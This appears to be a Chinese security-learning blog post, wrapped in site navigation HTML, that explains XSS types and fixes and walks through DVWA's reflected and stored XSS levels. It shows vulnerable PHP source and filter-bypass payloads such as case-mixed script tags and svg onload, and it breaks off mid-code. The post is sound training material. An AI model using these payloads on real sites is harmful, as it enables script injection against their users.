+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E8%BF%9E%E6%8E%A5%E7%94%B5%E8%84%91/%E4%BD%BF%E7%94%A8%E6%89%8B%E6%9C%BA%E6%89%A9%E5%B1%95%E7%94%B5%E8%84%91%E5%B1%8F%E5%B9%95/">使用手机扩展电脑屏幕</a></li>  <li class="file"><a href="/wiki/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/%E6%89%8B%E6%9C%BA%E8%BF%9E%E6%8E%A5%E7%94%B5%E8%84%91/%E4%BD%BF%E7%94%A8%E7%94%B5%E8%84%91%E6%8E%A7%E5%88%B6%E6%89%8B%E6%9C%BA/">使用电脑控制手机</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            树莓派
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BE/%E8%AE%A9%E6%A0%91%E8%8E%93%E6%B4%BE%E6%9C%89%E7%82%B9%E4%BA%8B%E5%81%9A01--%E5%AE%89%E8%A3%85%E7%B3%BB%E7%BB%9F/">让树莓派有点事做01--安装系统</a></li>  <li class="file"><a href="/wiki/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BE/%E8%AE%A9%E6%A0%91%E8%8E%93%E6%B4%BE%E6%9C%89%E7%82%B9%E4%BA%8B%E5%81%9A02--%E7%A7%81%E6%9C%89%E4%BA%91%E6%9C%8D%E5%8A%A1/">让树莓派有点事做02--私有云服务</a></li>  <li class="file"><a href="/wiki/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BE/%E8%AE%A9%E6%A0%91%E8%8E%93%E6%B4%BE%E6%9C%89%E7%82%B9%E4%BA%8B%E5%81%9A03--%E5%A4%96%E7%BD%91%E8%AE%BF%E9%97%AE/">让树莓派有点事做03--外网访问</a></li>  <li class="file"><a href="/wiki/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BE/%E8%AE%A9%E6%A0%91%E8%8E%93%E6%B4%BE%E6%9C%89%E7%82%B9%E4%BA%8B%E5%81%9A04--git%E6%9C%8D%E5%8A%A1%E5%99%A8/">让树莓派有点事做04--git服务器</a></li>  <li class="file"><a href="/wiki/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BE/%E8%AE%A9%E6%A0%91%E8%8E%93%E6%B4%BE%E6%9C%89%E7%82%B9%E4%BA%8B%E5%81%9A05--%E4%B8%8B%E8%BD%BD%E6%9C%BA/">让树莓派有点事做05--下载机</a></li>  </ul> 
+                    </li> 
+                     </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            渗透笔记
+                        </a>
+                         <ul class="unstyled" id="tree"> 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            常见服务
+                        </a>
+                         <ul class="unstyled" id="tree"> 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            139-samba
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1/139-samba/samba%E6%9C%8D%E5%8A%A1%E6%90%AD%E5%BB%BA%E4%B8%8E%E9%85%8D%E7%BD%AE/">Samba服务搭建与配置</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            80-http
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1/80-http/nginx%E6%90%AD%E5%BB%BAweb%E6%9C%8D%E5%8A%A1%E5%99%A8/">Nginx搭建Web服务器</a></li>  </ul> 
+                    </li> 
+                     <li class="file"><a href="/wiki/%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1/%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3&%E6%BC%8F%E6%B4%9E/">常见端口号&漏洞</a></li>  </ul> 
+                    </li> 
+                     </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            靶机笔记
+                        </a>
+                         <ul class="unstyled" id="tree"> 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            vulnhub
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/%E9%9D%B6%E6%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/5-MeAndMyGirlfriend/">【Vulnhub】Me And My Girlfriend--Workthourgh</a></li>  <li class="file"><a href="/wiki/%E9%9D%B6%E6%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/6-nightfall/">【Vulnhub】Sunset:nightfall--Workthourgh：未完成</a></li>  </ul> 
+                    </li> 
+                     </ul> 
+                    </li> 
+                     <li class="file"><a href="/wiki/index/">Index</a></li>  </ul> 
+    </div>
+    <script>
+        $(document).ready(function() {
+            var iconFolderOpenClass  = 'fa-folder-open';
+            var iconFolderCloseClass = 'fa-folder';
+            var iconAllExpandClass = 'fa-angle-double-down';
+            var iconAllPackClass = 'fa-angle-double-up';
+            // Handle directory-tree expansion:
+            // 左键单独展开目录
+            $(document).on('click', '#categories a[data-role="directory"]', function (event) {
+                event.preventDefault();
+
+                var icon = $(this).children('.fa');
+                var expanded = icon.hasClass(iconFolderOpenClass);
+                var subtree = $(this).siblings('ul');
+                icon.removeClass(iconFolderOpenClass).removeClass(iconFolderCloseClass);
+                if (expanded) {
+                    if (typeof subtree != 'undefined') {
+                        subtree.slideUp({ duration: 100 });
+                    }
+                    icon.addClass(iconFolderCloseClass);
+                } else {
+                    if (typeof subtree != 'undefined') {
+                        subtree.slideDown({ duration: 100 });
+                    }
+                    icon.addClass(iconFolderOpenClass);
+                }
+            });
+            // 右键展开下属所有目录
+            $('#categories a[data-role="directory"]').bind("contextmenu", function(event){
+                event.preventDefault();
+                
+                var icon = $(this).children('.fa');
+                var expanded = icon.hasClass(iconFolderOpenClass);
+                var listNode = $(this).siblings('ul');
+                var subtrees = $.merge(listNode.find('li ul'), listNode);
+                var icons = $.merge(listNode.find('.fa'), icon);
+                icons.removeClass(iconFolderOpenClass).removeClass(iconFolderCloseClass);
+                if(expanded) {
+                    subtrees.slideUp({ duration: 100 });
+                    icons.addClass(iconFolderCloseClass);
+                } else {
+                    subtrees.slideDown({ duration: 100 });
+                    icons.addClass(iconFolderOpenClass);
+                }
+            })
+            // 展开关闭所有目录按钮
+            $(document).on('click', '#allExpand', function (event) {
+                event.preventDefault();
+                
+                var icon = $(this).children('.fa');
+                var expanded = icon.hasClass(iconAllExpandClass);
+                icon.removeClass(iconAllExpandClass).removeClass(iconAllPackClass);
+                if(expanded) {
+                    $('#sidebar .fa.fa-folder').removeClass('fa-folder').addClass('fa-folder-open')
+                    $('#categories li ul').slideDown({ duration: 100 });
+                    icon.addClass(iconAllPackClass);
+                } else {
+                    $('#sidebar .fa.fa-folder-open').removeClass('fa-folder-open').addClass('fa-folder')
+                    $('#categories li ul').slideUp({ duration: 100 });
+                    icon.addClass(iconAllExpandClass);
+                }
+            });  
+        });
+    </script>
+
+    
+    <div id="toTop" class="fa fa-angle-up"></div>
+</aside>
+            
+            <section id="main"><article id="post-学习笔记/Web安全学习笔记/XSS/XSS基础" class="article article-type-post" itemscope itemprop="blogPost">
+    <div class="article-inner">
+        
+        
+            <header class="article-header">
+                
+                    <div class="article-meta">
+                        
+    <div class="article-category">
+    	<i class="fa fa-folder"></i>
+        <a class="article-category-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a><i class="fa fa-angle-right"></i><a class="article-category-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">Web安全学习笔记</a><i class="fa fa-angle-right"></i><a class="article-category-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/XSS/">XSS</a>
+    </div>
+
+                        
+                        
+    <div class="article-date">
+        <i class="fa fa-calendar"></i>
+        <a href="/wiki/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/XSS/XSS%E5%9F%BA%E7%A1%80/">
+            <time datetime="2020-06-12T02:57:19.000Z" itemprop="datePublished">2020-06-12</time>
+        </a>
+    </div>
+
+
+                        
+                            <i class="fa fa-bar-chart"></i>
+                            <span id="busuanzi_container_site_pv"><span id="busuanzi_value_page_pv"></span></span>    
+                        
+                        
+                    </div>
+                
+                
+    
+        <h1 class="article-title" itemprop="name">
+            XSS基础学习
+        </h1>
+    
+
+            </header>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+        
+        
+            
+                <div id="toc" class="toc-article">
+                <strong class="toc-title">Catalogue</strong>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS基础学习"><span class="toc-number">1.</span> <span class="toc-text">XSS基础学习</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS定义"><span class="toc-number">1.1.</span> <span class="toc-text">XSS定义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS分类"><span class="toc-number">1.2.</span> <span class="toc-text">XSS分类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#常用的测试语句"><span class="toc-number">1.3.</span> <span class="toc-text">常用的测试语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#修复建议"><span class="toc-number">1.4.</span> <span class="toc-text">修复建议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DVWA-XSS"><span class="toc-number">1.5.</span> <span class="toc-text">DVWA XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Reflected：Low"><span class="toc-number">1.5.1.</span> <span class="toc-text">Reflected：Low</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Reflected：Medium"><span class="toc-number">1.5.2.</span> <span class="toc-text">Reflected：Medium</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Reflected：High"><span class="toc-number">1.5.3.</span> <span class="toc-text">Reflected：High</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Reflected：Impossible"><span class="toc-number">1.5.4.</span> <span class="toc-text">Reflected：Impossible</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Stored：Low"><span class="toc-number">1.5.5.</span> <span class="toc-text">Stored：Low</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Stored：Medium"><span class="toc-number">1.5.6.</span> <span class="toc-text">Stored：Medium</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Stored：High"><span class="toc-number">1.5.7.</span> <span class="toc-text">Stored：High</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Stored：Impossible"><span class="toc-number">1.5.8.</span> <span class="toc-text">Stored：Impossible</span></a></li></ol></li></ol></li></ol>
+                </div>
+            
+        
+        
+            <h2 id="XSS基础学习"><a href="#XSS基础学习" class="headerlink" title="XSS基础学习"></a>XSS基础学习</h2><h3 id="XSS定义"><a href="#XSS定义" class="headerlink" title="XSS定义"></a>XSS定义</h3><p>原理：利用网站对用户输入、网站输出过滤不足的缺陷，构造能够对其他用户造成影响的html代码，从而对访问者造成侵害。</p>
+<p>（以下内容来自百度百科）</p>
+<p>XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java、 VBScript、ActiveX、 Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。</p>
+<hr>
+<h3 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h3><p><strong>反射型XSS：</strong>恶意脚本存在用户访问的链接上，网站通过链接上的参数来生成内容导致反射型XSS，通常位一次性，隐蔽性低，使用的时候需要进行混淆</p>
+<p><strong>存储型XSS：</strong>恶意脚本存在服务器上，用户通过访问该网页就会触发，隐蔽性高</p>
+<p><strong>DOM型XSS：</strong>属于一种特殊的反射型XSS，基于DOM对象模型，客户端可通过DOM动态修改页面内容，通过专门设计的URL使目标访问来触发</p>
+<hr>
+<h3 id="常用的测试语句"><a href="#常用的测试语句" class="headerlink" title="常用的测试语句"></a>常用的测试语句</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert<span class="string">`1`</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert</span>`<span class="attr">1</span>`&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>对于输入：</p>
+<ul>
+<li>过滤<code>&#39;</code>,<code>&quot;</code>,<code>&lt;</code>,<code>&gt;</code>,<code>on*</code>等非法字符</li>
+</ul>
+<p>对于输出</p>
+<ul>
+<li>对输出到页面的数据进行相应的编码转换，包括HTML实体编码、Javascript编码等</li>
+</ul>
+<h3 id="DVWA-XSS"><a href="#DVWA-XSS" class="headerlink" title="DVWA XSS"></a>DVWA XSS</h3><h4 id="Reflected：Low"><a href="#Reflected：Low" class="headerlink" title="Reflected：Low"></a>Reflected：Low</h4><p><img src="image-20200612103525633.png" alt="image-20200612103525633"></p>
+<p>源代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Hello '</span> . $_GET[ <span class="string">'name'</span> ] . <span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>array_key_exists(key，array) 函数的功能是：检查键名是否存在数组中</p>
+<p>例如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="keyword">array</span>(<span class="string">"Volvo"</span>=&gt;<span class="string">"XC90"</span>,<span class="string">"BMW"</span>=&gt;<span class="string">"X5"</span>);</span><br><span class="line"><span class="keyword">if</span> (array_key_exists(<span class="string">"Volvo"</span>,$a))</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"键存在！"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"键不存在！"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">运行结果：键存在</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>输入框的输入的值通过GET方法提交到服务器，服务端仅检测此值是否存在，存在就直接打印出来</p>
+<p>所以构造payload：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">pre</span>&gt;</span><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">alert</span>`<span class="attr">1</span>`&gt;</span><span class="tag">&lt;<span class="name">pre</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>就会触发</p>
+<p><img src="image-20200612103812395.png" alt="image-20200612103812395"></p>
+<h4 id="Reflected：Medium"><a href="#Reflected：Medium" class="headerlink" title="Reflected：Medium"></a>Reflected：Medium</h4><p>源代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = str_replace( <span class="string">'&lt;script&gt;'</span>, <span class="string">''</span>, $_GET[ <span class="string">'name'</span> ] );</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>str_replace(find,replace,string,count) 函数的作用是，将字符串中的值替换成另一个值，可以选择替换几个</p>
+<p>示例：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> str_replace(<span class="string">"world"</span>,<span class="string">"Shanghai"</span>,<span class="string">"Hello world!"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">运行结果：Hello Shanghai!</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>这里比上次多了一行代码，将name的值里面的<code>&lt;script&gt;</code>转换成空字符，只要构造语句里没有<code>&lt;script&gt;</code>，或者使用大小写，即可绕过该条限制</p>
+<p>Payload：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">pre</span>&gt;</span><span class="tag">&lt;<span class="name">scriPT</span>&gt;</span><span class="javascript">alert<span class="string">`1`</span></span><span class="tag">&lt;/<span class="name">scriPT</span>&gt;</span><span class="tag">&lt;<span class="name">pre</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>或者：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">pre</span>&gt;</span><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">alert</span>`<span class="attr">1</span>`&gt;</span><span class="tag">&lt;<span class="name">pre</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Reflected：High"><a href="#Reflected：High" class="headerlink" title="Reflected：High"></a>Reflected：High</h4><p>源代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F; Is there any input?</span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] !&#x3D; NULL ) &#123;</span><br><span class="line">    &#x2F;&#x2F; Get input</span><br><span class="line">    $name &#x3D; preg_replace( &#39;&#x2F;&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t&#x2F;i&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] );</span><br><span class="line">    &#x2F;&#x2F; Feedback for end user</span><br><span class="line">    echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>preg_replace 函数执行一个正则表达式的搜索和替换。</p>
+</blockquote>
+<p>这里的正则表达式的含义是匹配script字符串，只要没出现就行</p>
+<p>payload与之前一样：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">pre</span>&gt;</span><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">alert</span>`<span class="attr">1</span>`&gt;</span><span class="tag">&lt;<span class="name">pre</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Reflected：Impossible"><a href="#Reflected：Impossible" class="headerlink" title="Reflected：Impossible"></a>Reflected：Impossible</h4><p>源代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = htmlspecialchars( $_GET[ <span class="string">'name'</span> ] );</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>htmlspecialchars()函数的功能是：把预定义的字符 “&lt;” （小于）和 “&gt;” （大于）转换为 HTML 实体，即浏览器是把这玩意认为是字符而不是html标签的尖括号</p>
+</blockquote>
+<p>就过滤XSS代码而言，Impossible难度使用htmlspecialchars函数进行过滤，让<code>&lt;&gt;</code>尖括号失效，在这种场合，XSS也就不存在了，除非能绕过该函数的过滤</p>
+<h4 id="Stored：Low"><a href="#Stored：Low" class="headerlink" title="Stored：Low"></a>Stored：Low</h4><p><img src="image-20200612105334097.png" alt="image-20200612105334097"></p>
+<p>源代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'btnSign'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">'mtxMessage'</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">'txtName'</span> ] );</span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = stripslashes( $message );</span><br><span class="line">    $message = mysql_real_escape_string( $message );</span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = mysql_real_escape_string( $name );</span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>;</span><br><span class="line">    $result = mysql_query( $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>trim()：函数用于删除两侧空格</p>
+<p>stripslashes()：函数用于删除反斜杠，用于清理从html表单或数据库取回的数据</p>
+<p>mysql_real_escape_string()：函数转义字符串中的特殊字符（用在SQL语句的）</p>
+<p>die() ：函数输出一条消息，并退出当前脚本</p>
+</blockquote>
+<p>程序将POST接收到的数据进行转义，然后插入数据库中，再次访问网页的时候，数据从数据库取出来输出在网页上。</p>
+<p>这里的转义只是转义SQL中的特殊字符，所以<code>&lt;&gt;</code>还能用</p>
+<p>payload：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">alert</span>`<span class="attr">1</span>`&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可绕过前端输入框长度限制放在name里或者直接放在Message输入框里均可</p>
+<p><img src="image-20200612111129462.png" alt="image-20200612111129462"></p>
+<h4 id="Stored：Medium"><a href="#Stored：Medium" class="headerlink" title="Stored：Medium"></a>Stored：Medium</h4><p>源代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'btnSign'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">'mtxMessage'</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">'txtName'</span> ] );</span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = strip_tags( addslashes( $message ) );</span><br><span class="line">    $message = mysql_real_escape_string( $message );</span><br><span class="line">    $message = htmlspecialchars( $message );</span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = str_replace( <span class="string">'&lt;script&gt;'</span>, <span class="string">''</span>, $name );</span><br><span class="line">    $name = mysql_real_escape_string( $name );</span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );"</span>;</span><br><span class="line">    $result = mysql_query( $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span 